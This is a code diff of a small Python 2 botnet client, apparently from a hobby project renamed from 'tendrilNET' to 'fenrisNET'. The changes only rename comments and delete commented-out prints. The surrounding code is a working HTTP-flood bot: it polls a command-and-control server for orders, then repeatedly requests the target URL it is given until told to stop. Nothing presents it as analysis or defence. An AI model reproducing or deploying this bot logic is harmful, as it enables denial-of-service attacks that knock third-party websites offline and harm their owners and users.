@@ -3,7 +3,7 @@
 ########################################################################
 # Copyright 2015 Daniel Haake
 #
-# This file is part of tendrilNET                  
+# This file is part of fenrisNET                  
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -26,7 +26,7 @@ import urllib2
 candc = "127.0.0.1"
 
 while(True):
-    # get tendril orders
+    # get fenris orders
     orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
 
     # perform action (for extra cuteness)
@@ -41,11 +41,9 @@ while(True):
             if count%10 == 0:
                 orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
                 if orders[0] == "no":
-                    #print "stop attack"
                     break
                 else:
                     target = orders[1]
                 count = 0
-            #print target
             urllib2.urlopen(target)
             count += 1
